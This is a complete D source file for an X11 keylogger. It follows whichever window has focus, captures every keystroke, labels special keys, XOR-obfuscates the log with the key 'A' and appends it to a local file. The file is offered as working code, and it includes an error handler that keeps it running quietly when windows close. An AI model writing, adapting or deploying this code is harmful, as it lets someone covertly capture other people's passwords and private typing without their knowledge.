import std.stdio;
import x11.X;
import x11.keysym;
import x11.Xlib;
import x11.Xutil;
import std.conv;
import std.file;
import std.array;

enum saveFile = "test.txt";
enum xorKey = "A";
version = USEXOR;

void main() {
	XSetErrorHandler(&foo);
	Display* d = XOpenDisplay(null);
    Window root = DefaultRootWindow(d);
    Window curFocus;
    char[17] buf;
    KeySym ks;
    XComposeStatus comp;
    int len;
    int revert;
	XGetInputFocus(d, &curFocus, &revert);
    XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
	while (true)
    {
        XEvent ev;
        XNextEvent(d, &ev);
        switch (ev.type) {
            case FocusOut:
                if (curFocus != root)
                    XSelectInput(d, curFocus, 0);
                XGetInputFocus(d, &curFocus, &revert);
                if (curFocus == PointerRoot)
                    curFocus = root;
                XSelectInput(d, curFocus, KeyPressMask|KeyReleaseMask|FocusChangeMask);
                break;

            case KeyPress:
				len = XLookupString(&ev.xkey, buf.ptr, 16, &ks, &comp);
                string pressedkey = getKey(cast(int)ks);
				if (pressedkey != null) {
					logKey(pressedkey);
				} else {
                	buf[len]=0;
                	logKey(to!string(buf[0]));
				}
				debug {
					writefln("Key code: %d", cast(int)ks);
					if (pressedkey != null) {
						writefln("Pressed key: %s", pressedkey);
					} else {
                		buf[len]=0;
                		writefln("Pressed key: %s", buf[0]);
					}
				}
			default: break;
        }
    }
}

void logKey(string key) {
	version(USEXOR) {
		key = xor(key, xorKey);
	}
	std.file.append(saveFile, cast(void[])(key ~ " "));
}

string getKey(int key) {
	switch (key) {
		case 32: return "[space]";
		case 65288: return "[backspace]";
		case 65289: return "[tab]";
		case 65293: return "[enter]";
		case 65360: return "[home]";
		case 65361: return "[larrow]";
		case 65362: return "[uarrow]";
		case 65363: return "[rarrow]";
		case 65364: return "[darrow]";
		case 65365: return "[pageup]";
		case 65379: return "[insert]";
		case 65407: return "[numlock]";
		case 65505: return "[lshift]";
		case 65506: return "[rshift]";
		case 65507: return "[lctrl]";
		case 65508: return "[rctrl]";
		case 65509: return "[capslock]";
		case 65513: return "[lalt]";
		case 65514: return "[ralt]";
		case 65535: return "[delete]";
		default: return null;
	}
}

// A xor to encrypt our keylogs
string xor(string temp, string k) {
    int x = 0;
    string toReturn;
    for (int i = 0; temp.length > i; i++) {
        if (x > k.length - 1) {
            x = 0;
        }
        toReturn = toReturn ~= temp[i] ^ k[x];
        x++;
    }
    return toReturn;
}

// This func is here for when the user closes a window causing XGetInputFocus(d, &curFocus, &revert);
// to throw a badWindow error. We just return 0 because there's no need to try to recover from the 
// error as it will sort itself when the user clicks on a new window
extern (C) int foo(_XDisplay*, XErrorEvent*) nothrow
{
    return 0;
}